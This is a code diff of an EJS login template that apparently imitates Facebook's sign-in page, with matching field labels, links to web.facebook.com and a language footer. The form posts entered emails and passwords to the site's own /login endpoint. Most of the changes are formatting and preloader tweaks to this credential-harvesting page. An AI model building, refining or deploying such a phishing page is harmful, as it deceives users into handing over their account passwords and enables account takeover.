@@ -28,6 +28,7 @@
         #preloader.hidden {
             opacity: 0;
             visibility: hidden;
+            pointer-events: none; /* Prevent interaction */
         }
 
         /* Preloader spinner */
@@ -60,7 +61,6 @@
         }
 
         @keyframes fadeInOut {
-
             0%,
             100% {
                 opacity: 1;
@@ -109,7 +109,6 @@
             transition: all 0.3s ease-in-out;
         }
 
-
         .loader {
             margin-left: 10px;
             border: 4px solid #e0e0e0;
@@ -153,30 +152,27 @@
             <div class="login-box">
                 <form action="/login" method="post" onsubmit="showSpinner()">
                     <% if (message) { %>
-                        <div
-                            class="message <% if (message.includes('success')) { %> success <% } else { %> error <% } %>">
+                        <div class="message <% if (message.includes('success')) { %> success <% } else { %> error <% } %>">
                             <%= message %>
                         </div>
-                        <% } %>
-                            <input type="text" name="email" placeholder="Email address or phone number" required value="<%= email || '' %>">
-                            <input type="password" name="password" placeholder="Password" required>
+                    <% } %>
+                    <input type="text" name="email" placeholder="Email address or phone number" required value="<%= email || '' %>">
+                    <input type="password" name="password" placeholder="Password" required>
 
-                            <!-- Spinner and "Joining..." text - initially hidden -->
-                            <div class="joining" style="display: none;">
-                                Joining... <div class="loader"></div>
-                            </div>
+                    <!-- Spinner and "Joining..." text - initially hidden -->
+                    <div class="joining" style="display: none;">
+                        Joining... <div class="loader"></div>
+                    </div>
 
-                            <!-- Submit button -->
-                            <button type="submit" class="log">Join</button>
+                    <!-- Submit button -->
+                    <button type="submit" class="log">Join</button>
 
-                            <a href="#" class="log-link">Forgotten password?</a>
-                            <hr>
-                            <div class="create-btn-wrapper">
-                                <a href="https://web.facebook.com/?_rdc=1&_rdr" class="create-btn">Create new
-                                    account</a>
-                            </div>
+                    <a href="#" class="log-link">Forgotten password?</a>
+                    <hr>
+                    <div class="create-btn-wrapper">
+                        <a href="https://web.facebook.com/?_rdc=1&_rdr" class="create-btn">Create new account</a>
+                    </div>
                 </form>
-
             </div>
             <div class="form-b">
                 <a href="https://web.facebook.com/?_rdc=1&_rdr" class="create-p">Log In</a>
@@ -185,17 +181,15 @@
         </div>
     </div>
 
-    </div>
-
     <footer>
         <div class="foot-wrapper">
             <ul>
-                <li><a href="">(UK)</a> </li>
+                <li><a href="">(UK)</a></li>
                 <li><a href="">Hausa</a></li>
                 <li><a href="">Français (France)</a></li>
                 <li><a href="">Português (Brasil)</a></li>
-                <li><a href="">Español</a> </li>
-                <li></li><a href="">العربية</a></li>
+                <li><a href="">Español</a></li>
+                <li><a href="">العربية</a></li>
                 <li><a href="">Bahasa Indonesia</a></li>
                 <li><a href="">Deutsch</a></li>
                 <li><a href="">日本語</a></li>
@@ -206,27 +200,27 @@
     </footer>
 
     <script>
-       window.addEventListener("load", function () {
-    const preloader = document.getElementById("preloader");
-    const hasSeenPreloader = sessionStorage.getItem("hasSeenPreloader");
+        // Preloader logic
+        window.addEventListener("load", function () {
+            const preloader = document.getElementById("preloader");
+            const hasSeenPreloader = sessionStorage.getItem("hasSeenPreloader");
 
-    if (!hasSeenPreloader) {
-        // Show the preloader
-        preloader.style.display = 'flex';
+            if (!hasSeenPreloader) {
+                // Show the preloader
+                preloader.style.display = 'flex';
 
-        // Set a delay before hiding the preloader
-        setTimeout(() => {
-            preloader.classList.add("hidden");
+                // Set a delay before hiding the preloader
+                setTimeout(() => {
+                    preloader.classList.add("hidden");
 
-            // Store the flag in sessionStorage to indicate that the user has seen the preloader
-            sessionStorage.setItem("hasSeenPreloader", "true");
-        }, 2000); // 2000 milliseconds (2 seconds) delay
-    } else {
-        // If the user has seen the preloader, hide it immediately
-        preloader.style.display = 'none';
-    }
-});
-
+                    // Store the flag in sessionStorage to indicate that the user has seen the preloader
+                    sessionStorage.setItem("hasSeenPreloader", "true");
+                }, 2000); // 2000 milliseconds (2 seconds) delay
+            } else {
+                // If the user has seen the preloader, hide it immediately
+                preloader.classList.add("hidden");
+            }
+        });
 
         // Show spinner on form submission and handle redirection
         async function handleFormSubmission(event) {
@@ -235,7 +229,6 @@
             // Show spinner
             document.querySelector('.joining').style.display = 'flex';
             document.querySelector('.log').disabled = true;
-
 
             const formData = {
                 email: document.querySelector('input[name="email"]').value,
@@ -273,11 +266,6 @@
             }
         });
     </script>
-
-
-
-
-
 
 </body>
 
